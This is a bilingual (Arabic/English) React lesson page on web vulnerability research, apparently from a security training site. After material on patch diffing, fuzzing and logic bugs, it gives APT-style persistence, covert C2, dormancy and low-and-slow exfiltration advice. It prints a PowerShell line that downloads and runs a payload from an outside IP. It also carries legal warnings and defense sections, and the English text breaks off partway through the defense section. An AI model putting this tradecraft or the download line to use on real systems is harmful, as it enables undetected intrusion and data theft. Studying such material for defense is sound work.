"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="web-vuln-research">
      <L
        ar={<>
          <Section title="لماذا هذا الدرس مختلف">
            <p>الدروس السابقة (web-attacks، advanced-web، web-redteam-deep) علّمتك كيف تستغل ثغرات <b>معروفة</b>. هذا الدرس يعلّمك كيف تجد ثغرة <b>لم يكتشفها أحد بعد</b>، وكيف تبقى داخل الهدف لأشهر دون أن تُكتشف. هذه المهارة الحقيقية لفرق العمليات المصرّح لها فيدرالياً — لأن الثغرات الجديدة لا تحتوي توقيعات IDS وتعطي وصولاً قبل أن يكتب أحد patch.</p>
            <Analogy>الفرق بين قارئ CVE وباحث ثغرات هو الفرق بين قارئ الجرائد ومحقق الجرائم. الأول يعرف ما حدث؛ الثاني يعرف ما <b>سيحدث</b> لأنه يقرأ الكود قبل أن يقرأه الخصم.</Analogy>
            <Callout kind="danger" title="تحذير قانوني صارم">
              كل تقنية في هذا الدرس قانونية فقط على: (1) أنظمة تملكها، (2) برامج bug bounty صريحة، (3) عقد pentest موقّع، (4) تفويض حكومي مكتوب ضمن صلاحيات Title 10/50 أو ما يماثلها. اختبار ثغرة "صفرية" على نظام إنتاج بدون إذن = جناية فيدرالية تحت CFAA §1030(a)(5) حتى لو لم تستغلها.
            </Callout>
          </Section>

          <Section title="منهجية البحث — هرم الإيجاد">
            <p>الباحثون الجادون لا يبدأون بـ <span className="eng">fuzzer</span> عشوائي. يتبعون هرماً — كل طبقة أرخص بكثير من التالية:</p>
            <TwoCol>
              <Card title="1) قراءة المصدر — أرخص طبقة" color="green">
                لو الكود مفتوح، اقرأه. 40% من ثغرات الويب الحديثة تُكتشف بقراءة <span className="eng">git diff</span> لـ commit واحد. ركّز على: parsers، deserializers، URL handlers، template engines، authz middleware.
              </Card>
              <Card title="2) Patch Diffing — استخرج الثغرة من الإصلاح" color="amber">
                كل patch أمني يكشف عن ثغرتين: المُصلَحة، و <b>المنسية</b>. قارن قبل/بعد، حدّد التحقق المُضاف، وابحث عن كل مكان آخر يفتقد نفس التحقق.
              </Card>
              <Card title="3) Variant Analysis — التوسع الأفقي" color="amber">
                ثغرة واحدة = نمط. ابحث عن نفس النمط في 50 مكان آخر. <span className="eng">Project Zero</span> بنى سمعته على هذا — ثغرة <span className="eng">type confusion</span> واحدة في V8 أنتجت 12 CVE.
              </Card>
              <Card title="4) Targeted Fuzzing — للحالات المعقدة" color="red">
                بعد فهم البنية. <span className="eng">harness</span> مخصص للهدف، ليس <span className="eng">wfuzz</span> على endpoint. القيمة في الـ corpus، لا الأداة.
              </Card>
              <Card title="5) Specification Auditing — أعمق طبقة" color="red">
                اقرأ RFCs بعين عدائية. <span className="eng">Request smuggling</span> اكتشف لأن باحثاً قرأ RFC 7230 وفهم أن CL وTE لا يتفقان عند البروكسي. ثغرات بمليار دولار من قراءة وثيقة.
              </Card>
              <Card title="6) Logic Hunting — لا أداة تجدها" color="blue">
                ثغرات منطق العمل (race conditions في الدفع، state machine flaws، authorization bypasses). يدوية بحتة. أعلى ROI في bug bounties الكبيرة.
              </Card>
            </TwoCol>
          </Section>

          <Section title="Patch Diffing عملياً — الطريق الأقصر للـ n-day">
            <p>أكثر من 60% من &quot;الـ 0-days&quot; التي يستخدمها مهاجمو الدول هي n-days — ثغرات صدر patch لها لكن الضحية لم يحدّث. الفرق بينك وبين APT هو من يقرأ الـ patch أسرع.</p>
            <Step n={1} title="أمسك الـ commit الأمني">
              <p>راقب: <span className="eng">github.com/&lt;vendor&gt;/&lt;product&gt;/security/advisories</span>، رسائل <span className="eng">oss-security@</span>، وملفات <span className="eng">CHANGELOG</span>. كلمات تستحق التنبيه: <i>sanitize, escape, validate, auth, bypass, regression, CVE</i>.</p>
            </Step>
            <Step n={2} title="أعد بناء النسختين">
              <Terminal lines={[
                { p: "git clone https://github.com/vendor/product && cd product" },
                { p: "git checkout v1.2.3-vulnerable && docker build -t vuln ." },
                { p: "git checkout v1.2.4-patched   && docker build -t safe ." },
                { p: "# الفرق فقط — السطور التي أُضيفت كحماية:" },
                { p: "git diff v1.2.3-vulnerable v1.2.4-patched -- '*.py' '*.go' '*.ts'" },
              ]} />
            </Step>
            <Step n={3} title="عكس الـ patch إلى trigger">
              <p>كل سطر تحقق مُضاف يجيب على سؤال: &quot;ما المدخل الذي كان يكسر هذا؟&quot;. لو رأيت <span className="eng">if (user.id != session.id) reject()</span>، الـ trigger هو طلب يستخدم session واحدة وuser id آخر.</p>
            </Step>
            <Step n={4} title="تحقق من الـ regression">
              <p>كثير من الـ patches ناقصة. لو أصلحوا <span className="eng">/api/users/&lt;id&gt;</span>، تحقق من <span className="eng">/api/v2/users/&lt;id&gt;</span> و<span className="eng">/internal/users/&lt;id&gt;</span> و<span className="eng">/admin/users?id=</span>. غالباً واحد منها نُسي.</p>
            </Step>
            <Callout kind="info" title="مثال واقعي">
              <span className="eng">CVE-2023-46805 (Ivanti)</span>: Patch أوّلي أصلح مكاناً واحداً، الباحثون وجدوا 3 مسارات أخرى لنفس الـ auth bypass خلال 48 ساعة. النتيجة: استغلال جماعي على وكالات فيدرالية أمريكية.
            </Callout>
          </Section>

          <Section title="Variant Analysis — كيف تحوّل ثغرة إلى عشر">
            <p>لما تجد ثغرة، اسأل ثلاثة أسئلة فوراً:</p>
            <ol>
              <li><b>لماذا حدثت؟</b> ما الفرضية الخاطئة في عقل المطور؟ (مثلاً: &quot;الـ <span className="eng">URL parser</span> يطابق ما تراه عيني&quot;).</li>
              <li><b>أين الفرضية نفسها مكررة؟</b> grep لنفس النمط في الـ codebase وفي مشاريع منافسة.</li>
              <li><b>ما هو الـ root API الضعيف؟</b> لو كان <span className="eng">urllib.parse</span>، فكل مشروع يستخدمه عرضة. اصعد إلى الجذر.</li>
            </ol>
            <Code lang="bash">{`# نمط CodeQL لإيجاد كل deserialization غير مؤمن في الـ codebase:
# (مثال تعليمي — استبدل بالنوع المناسب لمنتجك)
import python
from Call call, Name name
where
  name.getId() = "pickle.loads" and
  call.getFunc().(Attribute).getAttr() = name.getId() and
  not exists(IfStmt guard | guard.getAChild*() = call)
select call, "Unguarded pickle.loads — RCE primitive"`}</Code>
            <Callout kind="good" title="الدفاع — تحويل variant analysis ضدّك">
              فرق الـ AppSec الناضجة تشغّل <span className="eng">CodeQL/Semgrep</span> على كل PR بقواعد مكتوبة من CVEs الماضية للمنتج نفسه. كل ثغرة تُكتشف داخلياً تتحول إلى قاعدة دائمة. هذا يقفل عائلة كاملة من المتغيرات قبل الإنتاج.
            </Callout>
          </Section>

          <Section title="بناء Fuzzing Harness للويب — ليس wfuzz">
            <p>الـ <span className="eng">fuzzing</span> الفعّال للويب ليس &quot;ضع كل payload على كل parameter&quot;. هو: <b>اعزل المكوّن، صفّه structure-aware، راقب التغطية</b>.</p>
            <TwoCol>
              <Card title="Coverage-Guided" color="amber">
                <span className="eng">AFL++, libFuzzer, restler-fuzzer</span> لـ APIs. ميزتها: تعرف متى دخلت branch جديد، فلا تضيع وقتاً على مدخلات تكافئ.
              </Card>
              <Card title="Grammar-Based" color="amber">
                <span className="eng">Domato</span> لـ DOM، <span className="eng">Boofuzz</span> لـ بروتوكولات. ضروري لمدخلات منظمة (HTTP/2, WebSocket frames).
              </Card>
              <Card title="Differential" color="green">
                أرسل نفس الـ payload لمحلّلَين (مثلاً Apache + Nginx، أو HAProxy + خلفية). كل اختلاف = ثغرة محتملة (request smuggling، parser confusion).
              </Card>
              <Card title="Stateful Web Fuzzing" color="red">
                <span className="eng">RESTler</span> من Microsoft. يقرأ OpenAPI، يبني grammar، يجرّب تسلسلات (POST → GET → PATCH) ليصل إلى حالات لا يصلها fuzzer بدون state.
              </Card>
            </TwoCol>
            <Code lang="bash">{`# مثال harness بسيط لـ JSON parser ضمن تطبيق Node.js:
# (هذا للمكتبة التي تملكها أو لها bug bounty)
npm i -D @jazzer.js/core
cat > fuzz.js <<'EOF'
const { parseUserInput } = require("./src/api");
module.exports.fuzz = (data) => {
  try { parseUserInput(data.toString()); }
  catch (e) {
    if (e instanceof TypeError && /Cannot read.*undefined/.test(e.message)) throw e;
  }
};
EOF
npx jazzer fuzz --sync`}</Code>
          </Section>

          <Section title="Logic Bugs — حيث لا أداة تساعدك">
            <p>أعلى bounties (Apple $500k، Meta $300k) تأتي من ثغرات منطق، ليس injection. لا fuzzer يجدها. إليك أنماط مثبّتة:</p>
            <ul>
              <li><b>State machine confusion:</b> هل يمكن استدعاء <span className="eng">/checkout/finalize</span> قبل <span className="eng">/checkout/pay</span>؟ أنظمة الدفع بنيت على افتراض تسلسل.</li>
              <li><b>TOCTOU في الويب:</b> يقرأ السيرفر صلاحية، تتغير، ثم يستخدمها. <span className="eng">race window</span> بـ HTTP/2 multiplexing تصل لأقل من 1ms — وحدها <span className="eng">Burp Turbo Intruder</span> &quot;single packet attack&quot; كافية لاستغلالها.</li>
              <li><b>Delegation flaws:</b> الـ <span className="eng">microservice A</span> يثق أن B تحقق من الـ user؛ B يثق بـ A. لا أحد يتحقق فعلياً.</li>
              <li><b>Currency/quantity rounding:</b> اشترِ بـ -1 من المنتج، استرد المال 0، رصيدك زاد. (استُخدم على Starbucks 2015، PayPal 2018).</li>
              <li><b>Reset poisoning:</b> توكن إعادة كلمة السر يحوي header قابل للحقن (<span className="eng">Host header injection</span>) → ترسل الرابط لنطاقك → استلام التوكن.</li>
            </ul>
          </Section>

          <Section title="ابتكار ثغرة عندما لا توجد — التفكير الخصومي">
            <p>أحياناً الكود نظيف. الثغرة في <b>بنية النظام</b>:</p>
            <ol>
              <li><b>اكتب نموذج التهديد للهدف من الذاكرة</b>، لا تنظر للكود. ما الفرضيات؟ (مثلاً: &quot;CDN يمنع IP غير مدرج&quot;).</li>
              <li><b>اقتل كل فرضية واحدة-واحدة.</b> هل يمكن تجاوز CDN عبر origin مكشوف؟ هل يمكن خداع الـ allow-list بـ DNS rebinding؟</li>
              <li><b>اربط primitives صغيرة.</b> CRLF + open redirect + cache بدون keying = SSRF لكامل CDN. كل جزء وحده &quot;لا يستحق الإبلاغ&quot;؛ مجتمعة = critical.</li>
              <li><b>اقرأ المنشورات الأكاديمية.</b> <span className="eng">USENIX Security, IEEE S&amp;P, BlackHat USA</span>. تقنيات تظهر فيها قبل سنتين من ظهورها في bug bounties.</li>
            </ol>
            <Callout kind="info" title="مصادر الباحثين الجادين">
              <span className="eng">PortSwigger Research, Google Project Zero blog, Orange Tsai (Devcore), Frans Rosén (Detectify), James Kettle, Sam Curry</span>. اقرأ كل تقرير writeup كأنه paper.
            </Callout>
          </Section>

          <Section title="عمليات الإقامة الطويلة — Long-Haul Tradecraft">
            <p>اكتشاف الثغرة هو 20% من العملية. الـ 80% الباقية: كيف تبقى داخل الشبكة 6-18 شهراً دون أن يُكتشف وجودك. هذا ما يميّز APT عن &quot;script kiddie لديه CVE&quot;.</p>
            <Analogy>الـ smash-and-grab يدخل، يأخذ، يخرج. الـ long-haul يدخل، يصبح <b>جزءاً من البنية</b>، يخرج المعلومة عبر سنة. الفرق كالفرق بين سارق محل واستخباراتي مزروع.</Analogy>
          </Section>

          <Section title="مبادئ الـ Long-Haul الستة">
            <Step n={1} title="Living Off the Land — لا تجلب أدواتك">
              <p>كل ثنائية تسقطها = توقيع. استخدم ما هو موجود: <span className="eng">curl, wget, certutil, bitsadmin, schtasks, wmic, PowerShell, sudo, cron, systemd</span>. الويبشل الأمثل في 2026 ليس <span className="eng">c99.php</span> — هو سطر واحد مدفون في ملف JSON إعدادات.</p>
            </Step>
            <Step n={2} title="Persistence بدون &quot;persistence&quot;">
              <p>تجنب <span className="eng">autoruns, services, scheduled tasks</span> الواضحة. بدلاً منها: عدّل ملف <span className="eng">.bashrc</span> لخدمة، أضف صفحة إلى Confluence/SharePoint داخلية فيها webshell، أنشئ Lambda بصلاحيات IAM دائمة، عدّل قالب CloudFormation. هذه &quot;مرئية&quot; لكن لا تثير alerts.</p>
            </Step>
            <Step n={3} title="C2 يبدو كـ traffic عادي">
              <Terminal lines={[
                { p: "# سيء — يُكتشف خلال أيام:" },
                { p: "powershell IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4:8080/payload')" },
                { p: "# جيد — يبدو كـ M365 sync:" },
                { p: "# domain fronting عبر Azure Front Door إلى bucket تحت سيطرتك،" },
                { p: "# beacon كل 4 ساعات بـ jitter ±25%، حجم متغير، أوقات العمل فقط" },
              ]} />
              <p>قواعد ذهبية: (أ) لا beacon ثابت الفترة، (ب) تجنب IPs، استخدم نطاقات بسمعة (ج) <span className="eng">TLS</span> بشهادة LetsEncrypt حقيقية على نطاق &quot;ممل&quot; مسجّل قبل 6 أشهر، (د) شغّل beacon فقط داخل ساعات عمل المنطقة الزمنية للهدف.</p>
            </Step>
            <Step n={4} title="Dormancy — التخفي عبر الانقطاع">
              <p>الـ implant الذكي ينام أسابيع. <span className="eng">Volt Typhoon</span> (CCP APT المُتهم باختراق بنى تحتية أمريكية حرجة) بقي خاملاً 5 سنوات في بعض الأهداف. التفعيل عبر trigger خارجي (مثلاً تغريدة بـ hash معين، أو سجل DNS TXT يتحدث).</p>
            </Step>
            <Step n={5} title="Tiered Access — لا تستخدم وصولك الأعمق">
              <p>اقسم وصولك ثلاث طبقات: (1) <b>recon</b> — IP عبر VPN عام، يمكن أن يحرق، (2) <b>operational</b> — تستخدمه لجمع المعلومات، (3) <b>crown jewel</b> — لا يُستخدم إلا لاستخراج البيانات الحاسمة، مرة كل أشهر. حرق طبقة 1 لا يكشف 2 أو 3.</p>
            </Step>
            <Step n={6} title="OPSEC اللغوي والثقافي">
              <p>تعليقات في الكود، رسائل خطأ، أسماء ملفات، أوقات النشاط، حتى ترتيب لوحة المفاتيح — كل واحد يخون الجنسية. APT الأمريكية وُصفت بأنها &quot;الوحيدة التي ترسل beacons في الإجازات الأمريكية لا الصينية&quot;. (راجع Equation Group leaks).</p>
            </Step>
          </Section>

          <Section title="استخراج البيانات بدون أن يُلاحظ">
            <ul>
              <li><b>تجزئة + تشفير + استبطاء:</b> 100GB على 90 يوم بمعدل 12MB/ساعة لا يُلاحظ في معظم بيئات.</li>
              <li><b>قنوات شرعية:</b> ارفع البيانات إلى Google Drive/Dropbox/OneDrive بحساب enterprise &quot;منسي&quot;. DLP غالباً تتسامح مع وجهات الـ SaaS المعروفة.</li>
              <li><b>DNS exfil كملاذ أخير</b> فقط؛ بطيء وصاخب لو قارنته بـ HTTPS لخدمة معروفة.</li>
              <li><b>Steganography</b> داخل صور تُرفع لمنصات تواصل اجتماعي شرعية (مع الحذر من إعادة الترميز).</li>
            </ul>
          </Section>

          <Section title="الدفاع — كيف يصطاد المدافع البارع كل ما سبق">
            <Callout kind="good" title="ضد Patch Diffing">
              (1) Coordinated disclosure مع backporting كامل — أصلح كل المسارات معاً. (2) Vulnerability-equivalent class scanning بـ <span className="eng">Semgrep/CodeQL</span> قبل الإصدار. (3) Honeypatches — endpoints قديمة تبدو ضعيفة لكنها تنبّه.
            </Callout>
            <Callout kind="good" title="ضد Long-Haul">
              <ul>
                <li><b>Hunting بدلاً من alerting.</b> ابحث عن &quot;ما الذي يبدو طبيعياً جداً ليكون طبيعياً؟&quot; — مثلاً curl يعمل من Confluence server إلى Azure CDN كل 4 ساعات بدقة.</li>
                <li><b>Beacon analytics:</b> ابحث عن انتظام إحصائي في الفواصل الزمنية. <span className="eng">RITA, Beacon Detection</span> في Zeek.</li>
                <li><b>Identity-centric detection:</b> دورات حياة الهويات المخدومة تحت رقابة. حسابات تُستخدم كل 30 يوماً بدقة = شذوذ.</li>
                <li><b>Canary tokens</b> في كل مكان: مستندات مصرفية مزيفة، AWS keys مزيفة في الكود، صفحات SharePoint مفخخة. كل وصول = تنبيه فوري.</li>
                <li><b>Egress baselining:</b> اعرف الوجهات الطبيعية لكل نظام. Confluence لا يحتاج الإنترنت الخارجي. ادمج هذا في policy.</li>
                <li><b>Threat hunting cadence:</b> فرق ناضجة (FBI Cyber Action Team، CISA hunt) تفترض أن العدو داخل، تبحث استباقياً كل أسبوع.</li>
              </ul>
            </Callout>
            <Callout kind="info" title="MITRE ATT&CK mapping">
              معظم تقنيات هذا الدرس: <span className="eng">T1190 (Exploit Public-Facing App)، T1133 (External Remote Services)، T1078 (Valid Accounts)، T1071.001 (Web C2)، T1568 (Dynamic Resolution)، T1102 (Web Service)، T1021 (Remote Services)، T1567 (Exfil Over Web Service)، T1546 (Event Triggered Execution)</span>.
            </Callout>
          </Section>

          <Section title="الخط الأخلاقي والقانوني — قبل أن تبدأ">
            <Callout kind="danger" title="حدود لا تُعبر">
              <ul>
                <li><b>لا تختبر على نظام بدون إذن مكتوب.</b> &quot;الموقع علني&quot; لا يعني &quot;مأذون&quot;. CFAA يلاحقك.</li>
                <li><b>لا تطلق ثغرة في البرّية</b> حتى لو كانت ضد &quot;عدو&quot;. لو سُربت، ستُستخدم ضد بنية تحتية حليفة.</li>
                <li><b>VEP (Vulnerabilities Equities Process):</b> لو وجدت 0-day خطيرة، قانون أمريكي ملزم (PPD-41) يطلب تقييم Equities قبل استخدام عملياتي. لا تتخطاه.</li>
                <li><b>أبلغ المؤسسة المعنية</b> عبر القناة الصحيحة (CIRT الفيدرالي، CISA، أو الـ vendor) عند توفر مسار coordinated disclosure.</li>
                <li><b>وثّق كل خطوة</b> مع طابع زمني وتفويض. حماية شخصية + حماية الـ chain of custody لو تحوّل الأمر إلى قضية.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="مراجع للتعمق">
            <ul>
              <li><span className="eng">&quot;A Bug Hunter&apos;s Diary&quot; — Tobias Klein</span></li>
              <li><span className="eng">Project Zero blog (googleprojectzero.blogspot.com)</span> — كل تقرير دراسة كاملة في variant analysis</li>
              <li><span className="eng">PortSwigger Research</span> — James Kettle et al. — تقنيات ويب جديدة سنوياً</li>
              <li><span className="eng">CISA Hunting Playbooks</span> و<span className="eng">FBI/CISA joint advisories</span> — كيف تُكتشف العمليات طويلة المدى فعلياً</li>
              <li><span className="eng">Mandiant M-Trends</span> السنوي — متوسط dwell time العالمي وكيف يتطور</li>
              <li><span className="eng">USENIX Security &amp; IEEE S&amp;P proceedings</span> — أبحاث أكاديمية تسبق الصناعة بسنتين</li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="Why this lesson is different">
            <p>Earlier lessons (web-attacks, advanced-web, web-redteam-deep) taught you to weaponize <b>known</b> vulnerabilities. This one teaches you to find one <b>nobody has reported yet</b>, and to live inside a target for months without detection. This is the actual skill set of authorized federal offensive teams — novel bugs have no IDS signatures, and access predates any patch.</p>
            <Analogy>The difference between a CVE reader and a vulnerability researcher is the difference between a newspaper subscriber and a homicide detective. The first knows what happened; the second predicts what <b>will</b> happen because they read the source code before the adversary does.</Analogy>
            <Callout kind="danger" title="Hard legal boundary">
              Every technique here is legal only against: (1) systems you own, (2) explicit bug-bounty scope, (3) signed pentest contract, (4) written government authorization under Title 10/50 or equivalent. Testing a 0-day on a production system without authorization = federal felony under CFAA §1030(a)(5), even if you don&apos;t weaponize it.
            </Callout>
          </Section>

          <Section title="Research methodology — the discovery pyramid">
            <p>Serious researchers don&apos;t start with a random fuzzer. They climb a pyramid where each rung is far cheaper than the next:</p>
            <TwoCol>
              <Card title="1) Source reading — cheapest" color="green">
                If the code is open, read it. ~40% of modern web bugs come from reading a single <span className="eng">git diff</span>. Focus on parsers, deserializers, URL handlers, template engines, authz middleware.
              </Card>
              <Card title="2) Patch diffing — bug from the fix" color="amber">
                Every security patch leaks two bugs: the one fixed, and the one <b>forgotten</b>. Compare before/after, identify the added validation, then hunt every other place missing it.
              </Card>
              <Card title="3) Variant analysis — horizontal scaling" color="amber">
                One bug = one pattern. Find that pattern in 50 other places. Project Zero built its reputation on this — a single V8 type-confusion produced 12 CVEs.
              </Card>
              <Card title="4) Targeted fuzzing — for hard cases" color="red">
                After you understand the structure. Custom harness for the target, not <span className="eng">wfuzz</span> on an endpoint. Value lives in the corpus, not the tool.
              </Card>
              <Card title="5) Spec auditing — deepest layer" color="red">
                Read RFCs adversarially. Request smuggling existed because someone read RFC 7230 and noticed CL/TE disagreement at proxies. Billion-dollar bugs from reading a doc.
              </Card>
              <Card title="6) Logic hunting — no tool finds these" color="blue">
                Business-logic flaws (payment races, state-machine errors, authz bypasses). Pure manual work. Highest ROI in mature bug bounties.
              </Card>
            </TwoCol>
          </Section>

          <Section title="Patch diffing in practice — the shortest path to an n-day">
            <p>More than 60% of &quot;state-actor 0-days&quot; are actually n-days — patched bugs running unpatched. The gap between you and an APT is who reads the patch faster.</p>
            <Step n={1} title="Catch the security commit">
              <p>Watch <span className="eng">github.com/&lt;vendor&gt;/&lt;product&gt;/security/advisories</span>, the <span className="eng">oss-security@</span> list, and CHANGELOGs. Trigger words: <i>sanitize, escape, validate, auth, bypass, regression, CVE</i>.</p>
            </Step>
            <Step n={2} title="Build both versions">
              <Terminal lines={[
                { p: "git clone https://github.com/vendor/product && cd product" },
                { p: "git checkout v1.2.3-vulnerable && docker build -t vuln ." },
                { p: "git checkout v1.2.4-patched   && docker build -t safe ." },
                { p: "# only the diff — added validation lines:" },
                { p: "git diff v1.2.3-vulnerable v1.2.4-patched -- '*.py' '*.go' '*.ts'" },
              ]} />
            </Step>
            <Step n={3} title="Reverse the patch into a trigger">
              <p>Each added check answers: &quot;what input was breaking this?&quot;. If you see <span className="eng">if (user.id != session.id) reject()</span>, the trigger is a request mixing one session with a different user id.</p>
            </Step>
            <Step n={4} title="Check for the regression">
              <p>Patches are often incomplete. If they fixed <span className="eng">/api/users/&lt;id&gt;</span>, check <span className="eng">/api/v2/users/&lt;id&gt;</span>, <span className="eng">/internal/users/&lt;id&gt;</span>, <span className="eng">/admin/users?id=</span>. One of them is usually missed.</p>
            </Step>
            <Callout kind="info" title="Real example">
              <span className="eng">CVE-2023-46805 (Ivanti)</span>: initial patch fixed one path; researchers found three more bypass routes within 48 hours, leading to mass exploitation against US federal agencies.
            </Callout>
          </Section>

          <Section title="Variant analysis — turning one bug into ten">
            <p>When you find a bug, ask three questions immediately:</p>
            <ol>
              <li><b>Why did it happen?</b> Which wrong assumption was in the developer&apos;s head? (e.g., &quot;the URL parser sees what my eye sees&quot;).</li>
              <li><b>Where else is that same assumption baked in?</b> grep for the pattern across the codebase and competing projects.</li>
              <li><b>What is the weak root API?</b> If it&apos;s <span className="eng">urllib.parse</span>, every project using it is exposed. Climb to the root.</li>
            </ol>
            <Code lang="bash">{`# CodeQL pattern to find every unguarded deserialization in a Python codebase:
# (illustrative — adapt to your stack)
import python
from Call call, Name name
where
  name.getId() = "pickle.loads" and
  call.getFunc().(Attribute).getAttr() = name.getId() and
  not exists(IfStmt guard | guard.getAChild*() = call)
select call, "Unguarded pickle.loads — RCE primitive"`}</Code>
            <Callout kind="good" title="Defense — variant analysis turned against you">
              Mature AppSec teams run <span className="eng">CodeQL/Semgrep</span> on every PR with rules written from prior CVEs in the same product. Each internally-found bug becomes a permanent rule. This kills entire bug families before production.
            </Callout>
          </Section>

          <Section title="Building a web fuzzing harness — not wfuzz">
            <p>Effective web fuzzing is not &quot;throw every payload at every parameter&quot;. It is: <b>isolate the component, structure-aware grammar, observe coverage</b>.</p>
            <TwoCol>
              <Card title="Coverage-guided" color="amber">
                <span className="eng">AFL++, libFuzzer, restler-fuzzer</span> for APIs. They know when a new branch is hit, so they don&apos;t waste cycles on equivalent inputs.
              </Card>
              <Card title="Grammar-based" color="amber">
                <span className="eng">Domato</span> for DOM, <span className="eng">Boofuzz</span> for protocols. Required for structured inputs (HTTP/2, WebSocket frames).
              </Card>
              <Card title="Differential" color="green">
                Send the same payload to two parsers (Apache + Nginx, or HAProxy + backend). Every divergence = candidate bug (smuggling, parser confusion).
              </Card>
              <Card title="Stateful web fuzzing" color="red">
                Microsoft&apos;s <span className="eng">RESTler</span> reads OpenAPI, builds a grammar, tries sequences (POST → GET → PATCH) to reach states a stateless fuzzer never reaches.
              </Card>
            </TwoCol>
            <Code lang="bash">{`# Simple harness for a JSON parser inside a Node.js app
# (something you own or have explicit bounty scope for)
npm i -D @jazzer.js/core
cat > fuzz.js <<'EOF'
const { parseUserInput } = require("./src/api");
module.exports.fuzz = (data) => {
  try { parseUserInput(data.toString()); }
  catch (e) {
    if (e instanceof TypeError && /Cannot read.*undefined/.test(e.message)) throw e;
  }
};
EOF
npx jazzer fuzz --sync`}</Code>
          </Section>

          <Section title="Logic bugs — where no tool helps">
            <p>The largest bounties (Apple $500k, Meta $300k) come from logic flaws, not injection. No fuzzer finds them. Patterns that pay:</p>
            <ul>
              <li><b>State-machine confusion:</b> can <span className="eng">/checkout/finalize</span> be called before <span className="eng">/checkout/pay</span>? Payment systems assume a sequence.</li>
              <li><b>TOCTOU on the web:</b> server checks an authz, it changes, then it&apos;s used. With HTTP/2 multiplexing the race window is &lt;1ms — Burp Turbo Intruder&apos;s &quot;single-packet attack&quot; alone is enough.</li>
              <li><b>Delegation flaws:</b> microservice A trusts B to verify; B trusts A. Nobody actually checks.</li>
              <li><b>Currency / quantity rounding:</b> buy -1 of an item, refund 0, balance grows. (Starbucks 2015, PayPal 2018.)</li>
              <li><b>Reset poisoning:</b> password-reset URL contains an injectable header (Host header injection) → mail link points to your domain → token capture.</li>
            </ul>
          </Section>

          <Section title="Inventing a bug when none exists — adversarial thinking">
            <p>Sometimes the code is clean. The bug is in the <b>system architecture</b>:</p>
            <ol>
              <li><b>Write the threat model from memory</b>, before reading code. What are the assumptions? (e.g., &quot;CDN blocks IPs not on the allowlist&quot;.)</li>
              <li><b>Kill each assumption.</b> Can you bypass the CDN via an exposed origin? Trick the allowlist with DNS rebinding?</li>
              <li><b>Chain small primitives.</b> CRLF + open redirect + un-keyed cache = SSRF for an entire CDN. Each is &quot;not worth reporting&quot; alone; together = critical.</li>
              <li><b>Read academic work.</b> USENIX Security, IEEE S&amp;P, BlackHat USA. Techniques surface there 1–2 years before they hit bug bounties.</li>
            </ol>
            <Callout kind="info" title="Researchers worth following">
              <span className="eng">PortSwigger Research, Google Project Zero, Orange Tsai (Devcore), Frans Rosén (Detectify), James Kettle, Sam Curry</span>. Read every writeup like a paper.
            </Callout>
          </Section>

          <Section title="Long-haul tradecraft">
            <p>Finding the bug is 20% of the operation. The other 80% is staying inside for 6–18 months without being seen. This is what separates an APT from &quot;a script kiddie with a CVE&quot;.</p>
            <Analogy>Smash-and-grab: in, take, out. Long-haul: in, become <b>part of the infrastructure</b>, exfiltrate over a year. The difference between a shop thief and an embedded intelligence officer.</Analogy>
          </Section>

          <Section title="The six long-haul principles">
            <Step n={1} title="Living off the land — bring nothing">
              <p>Every binary you drop is a signature. Use what&apos;s already there: <span className="eng">curl, wget, certutil, bitsadmin, schtasks, wmic, PowerShell, sudo, cron, systemd</span>. The 2026 ideal webshell isn&apos;t <span className="eng">c99.php</span> — it&apos;s a one-liner buried in a JSON config file.</p>
            </Step>
            <Step n={2} title="Persistence without &quot;persistence&quot;">
              <p>Avoid obvious autoruns, services, scheduled tasks. Instead: edit a service&apos;s <span className="eng">.bashrc</span>, plant a webshell as a Confluence/SharePoint page, create a Lambda with sticky IAM, edit a CloudFormation template. These are visible but don&apos;t fire alerts.</p>
            </Step>
            <Step n={3} title="C2 that looks like normal traffic">
              <Terminal lines={[
                { p: "# bad — caught in days:" },
                { p: "powershell IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4:8080/payload')" },
                { p: "# good — looks like M365 sync:" },
                { p: "# domain fronting via Azure Front Door to an attacker-controlled bucket," },
                { p: "# beacon every 4h with ±25% jitter, varied size, business-hours only" },
              ]} />
              <p>Golden rules: (a) never a fixed beacon period, (b) avoid raw IPs — use aged, reputable domains, (c) real LE certs on a &quot;boring&quot; domain registered 6+ months ago, (d) run only inside the target&apos;s working hours.</p>
            </Step>
            <Step n={4} title="Dormancy — hiding by being silent">
              <p>A smart implant sleeps for weeks. <span className="eng">Volt Typhoon</span> (PRC APT linked to US critical-infrastructure intrusions) sat dormant for 5 years in some targets. Activation via external trigger — a tweet hash, a DNS TXT record.</p>
            </Step>
            <Step n={5} title="Tiered access — never touch your deepest foothold">
              <p>Split access into three tiers: (1) <b>recon</b> — public-VPN IPs, expendable, (2) <b>operational</b> — used for collection, (3) <b>crown jewel</b> — touched only for decisive exfil, once every few months. Burning tier 1 doesn&apos;t expose 2 or 3.</p>
            </Step>
            <Step n={6} title="Linguistic and cultural OPSEC">
              <p>Code comments, error strings, file names, work hours, even keyboard layout — each leaks nationality. One US APT is described as &quot;the only one that beacons during US holidays, not Chinese ones&quot;. (See Equation Group leaks.)</p>
            </Step>
          </Section>

          <Section title="Exfiltration without being noticed">
            <ul>
              <li><b>Chunk + encrypt + slow:</b> 100 GB across 90 days at 12 MB/hr is invisible in most environments.</li>
              <li><b>Legitimate channels:</b> upload to a forgotten enterprise Google Drive / Dropbox / OneDrive. DLP usually tolerates known-SaaS destinations.</li>
              <li><b>DNS exfil only as last resort</b> — slow and noisy compared to HTTPS to a known service.</li>
              <li><b>Steganography</b> inside images posted to legitimate social platforms (mind re-encoding).</li>
            </ul>
          </Section>

          <Section title="Defense — how a sharp defender hunts everything above">
            <Callout kind="good" title="Against patch diffing">
              (1) Coordinated disclosure with full backporting — fix every variant together. (2) Vulnerability-equivalent class scanning with <span className="eng">Semgrep/CodeQL</span> pre-release. (3) Honeypatches — old endpoints that look vulnerable but alert.
            </Callout>
            <Callout kind="good" title="Against long-haul">
              <ul>
                <li><b>Hunt, don&apos;t alert.</b> Ask &quot;what looks too normal to be normal?&quot; — e.g., curl from a Confluence host to an Azure CDN every 4h with metronome regularity.</li>
